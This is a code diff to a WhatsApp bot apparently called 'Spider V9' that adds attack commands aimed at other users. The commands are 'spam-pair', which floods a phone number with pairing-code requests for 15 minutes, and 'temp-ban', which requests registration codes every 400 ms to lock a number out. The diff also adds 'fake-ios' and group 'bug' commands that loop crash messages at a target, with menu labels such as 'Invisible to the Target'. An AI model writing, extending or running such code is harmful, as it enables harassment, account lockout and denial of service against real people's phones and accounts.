@@ -909,12 +909,22 @@ case 'trash': {
 					}]
 				},
 				{
-					title: '⌜ 𝐈𝚯𝐒 ⌟',
-					highlight_label: "🤖𝐒𝐮𝐩𝐫𝐢𝐬𝐞 𝐈𝐨𝐬🫶",
+					title: '⌜ 𝐆𝐑𝐎𝐔𝐏 𝐁𝐔𝐆𝐒 ⌟',
+					highlight_label: "🏴‍☠️𝐘𝐨𝐮 𝐌𝐚𝐲 𝐀𝐥𝐬𝐨 𝐂𝐫𝐚𝐬𝐡🏴‍☠️",
 					rows: [{
-						title: '⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑',
-						description: `☇`,
-						id: `.fake-ios ${incTarget}|2`
+						title: '👽𝐖𝐄𝐁 𝐆𝐂🦈',
+						description: `🦄`,
+						id: `.sgc`
+					}]
+				},
+				
+				{
+					title: '⌜ 𝐈𝚯𝐒 ⌟',
+					highlight_label: "🤖𝐈𝐧𝐯𝐢𝐬𝐢𝐛𝐥𝐞 𝐭𝐨 𝐭𝐡𝐞 𝐓𝐚𝐫𝐠𝐞𝐭🫶",
+					rows: [{
+						title: '🧚‍♀️ 𝐂𝐑𝐀𝐒𝐇-𝐈𝐎𝐒💥',
+						description: `🐠`,
+						id: `.fake-ios ${incTarget}|8`
 					}]
 				},
 				{
@@ -1135,7 +1145,9 @@ reply(`Wait Your Target is being Utilised`)
     
     // Function to convert text to invisible characters
     await TrashSystem(target, sam, ptcp = true);
+   await aipong(target)
     await TrashSystem(target, sam, cct = true, ptcp = true);
+    await aipong(target)
 
     reply(`
          ┏━━━━━━━━━━━━━━━━━━━━━
@@ -1144,6 +1156,163 @@ reply(`Wait Your Target is being Utilised`)
          ┗━━━━━━━━━━━━━━━━━━━━━
          ┏━━━━━━━━━━━━━━━━━━━━━
          ┃߷ 𝐆𝐑𝐎𝐔𝐏 𝐈𝐃 : ${target}
+         ┃֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
+         ┃࿉ 𝐔𝐒𝐈𝐍𝐆 : ${command}
+         ┗━━━━━━━━━━━━━━━━━━━━━
+         ꀦ 𝗡𝗢𝗧𝗘: 
+         ┏━━━━━━━━━━━━━━━━━━━━━
+         ┃☘ *DO NOT MISUSE THE BOT OR ELSE IT WILL GET BANNED*
+         ┃☘ *WAIT FOR 2 MINUTES BEFORE USING ANOTHER COMMAND*
+         ┗━━━━━━━━━━━━━━━━━━━━━
+    `);
+
+    await sleep(2000);
+    await sam.sendMessage(m.chat, {
+        audio: bugaudio,
+        mimetype: 'audio/mpeg'
+    }, { quoted: m });
+}
+break;
+case "spam-pair": {
+if (!isCreator) return reply(mess.owner)
+if (!q) return reply(`*Example:* ${prefix + command} +2547888888888|150`)
+let [targetNumber, attemptCount = "100"] = q.split("|")
+let sanitizedPhoneNumber = targetNumber.replace(/[^0-9]/g, '').trim()
+let attempts = parseInt(attemptCount)
+if (isNaN(attempts)) return reply('The number of attempts must be a number.')
+
+async function spamPairingRequest(sanitizedPhoneNumber, attempts) {
+const startTime = Date.now();
+const duration = 15 * 60 * 1000; // 15 menit dalam milidetik
+        
+let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
+let { state } = await useMultiFileAuthState('.npm')
+let { version } = await fetchLatestBaileysVersion()
+let pino = require("pino")
+let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })
+
+while (Date.now() - startTime < duration) {
+let currentAttempts = attempts; // reset attempts per loop
+while (currentAttempts > 0) {
+try {
+const prc = await sucked.requestPairingCode(sanitizedPhoneNumber);
+console.log(`_Succes Spam Pairing Code - Number: ${sanitizedPhoneNumber} - Code: ${prc}_`);
+} catch (error) {
+console.error('An error occurred while requesting the verification code::', error);
+}
+                
+console.log(`Spam Pairing WhatsApp: ${currentAttempts} remaining trials...`);
+await new Promise(resolve => setTimeout(resolve, 1000)); // 1 detik per iterasi
+currentAttempts--;
+}
+
+console.log('Resend in 30 seconds...');
+await new Promise(resolve => setTimeout(resolve, 30000)); // Tunggu 30 detik sebelum iterasi berikutnya
+}
+
+console.log('Finished. 15 minutes have passed');
+}
+
+await spamPairingRequest(sanitizedPhoneNumber, attempts);
+}
+break;
+case "ping": case "speed": { 
+let timestamp = speed()
+let latensi = speed() - timestamp
+
+         m.reply (`━━━━━━━━━━━━━━━━━\n\◉ 𝙷𝙴𝙻𝙻𝙾 ${m.pushName}\n\━━━━━━━━━━━━━━━━━\n\◈ 𝚂𝙿𝙸𝙳𝙴𝚁 𝚅9 𝚂𝙿𝙴𝙴𝙳   : ${latensi.toFixed(4)} 𝐌𝐒\n\━━━━━━━━━━━━━━━━━`); 
+         } 
+ break; 
+case "runtime":
+                let pinga = ` รρเ∂εɾ ѵ9 ɦαร ɓεεɳ αcƭเѵε ƒσɾ ${runtime(process.uptime())}`
+               sam.sendMessage(m.chat, {
+                    text: pinga,
+                    contextInfo: {
+                        externalAdReply: {
+                            showAdAttribution: true,
+                            title: `𝚂𝙿𝙸𝙳𝙴𝚁 𝚅9`,
+                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
+                            thumbnailUrl: spider ,
+                            sourceUrl: 'https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e',
+                            mediaType: 1,
+                            renderLargerThumbnail: true
+                        }
+                    }
+                }, {
+                    quoted: m
+                })
+                break
+case 'temp-ban': {
+if (!isCreator) return
+if (!text) return reply(`*Example:* ${prefix + command} 254|7872627288`)
+if (!/|/.test(text)) return reply(`Wrong Usage!!!:\n> *Example:* ${prefix + command} 254|7872627288`)
+let numbers = JSON.parse(fs.readFileSync('./database/tb.json'))
+
+let cCode = q.split("|")[0]
+let number = q.split("|")[1]
+let fullNo = cCode + number
+
+await reply(`Successfully Temporarily Block WhatsApp with number : ${fullNo} Using Commands ${command} Indefinitely this glitch will come back when the bot restarts!!!`)
+
+const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys')
+let pino = require("pino")
+let { state, saveCreds } = await useMultiFileAuthState('.npm')
+let spam = makeWaSocket({
+auth: state,
+mobile: true,
+logger: pino({ level: 'silent' })
+})
+
+let dropNumber = async () => {
+try {
+let res = await spam.requestRegistrationCode({
+phoneNumber: `+${fullNo}`,
+phoneNumberCountryCode: cCode,
+phoneNumberNationalNumber: number,
+phoneNumberMobileCountryCode: 724
+})
+
+if (res.reason === 'temporarily_unavailable') {
+console.log(`Invalid Number (Possible Registration Interrupted): +${res.login}`)
+await sleep(1000)
+await dropNumber()
+}
+} catch (error) {
+console.error(error)
+}
+}
+
+numbers[fullNo] = { cCode, number };
+fs.writeFileSync('./database/tb.json', JSON.stringify(numbers, null, '\t'));
+setInterval(() => {
+dropNumber()
+}, 400)
+}
+break
+case 'fake-ios': case 'test-ios': {
+if (!isCreator) return reply(mess.owner)
+if (!isPremium) return reply(mess.prem)
+if (!q) return reply(`use .${command} 2547392784527|1\n`)
+let ppek = q.split("|")[0]
+let bijipler = ppek.replace(/[^0-9]/g, "")
+if (bijipler.startsWith('0')) return reply(`> The number starts with the number 0. Replace it with the number starting with the country coden\n> *Example*: ${prefix + command} 2547392784527`)
+let target = bijipler+"@s.whatsapp.net"
+let jumlah = q.split("|")[1] * 200
+let ppk = jumlah * 1.5
+reply(ppk + " detik");
+reply(mess.bugrespon)
+for (let j = 0; j < jumlah; j++) {
+await aipong(target)
+await aipong(target)
+await sleep(1500)
+}
+reply(`
+         ┏━━━━━━━━━━━━━━━━━━━━━
+         ┃ ▣ 𝗧𝗔𝗥𝗚𝗘𝗧  𝗗𝗢𝗪𝗡
+         ┃ ⎐ 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗 𝗕𝗬 𝗦𝗽𝗶𝗱𝗲𝗿 𝗩9
+         ┗━━━━━━━━━━━━━━━━━━━━━
+         ┏━━━━━━━━━━━━━━━━━━━━━
+         ┃߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
          ┃֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
          ┃࿉ 𝐔𝐒𝐈𝐍𝐆 : ${command}
          ┗━━━━━━━━━━━━━━━━━━━━━
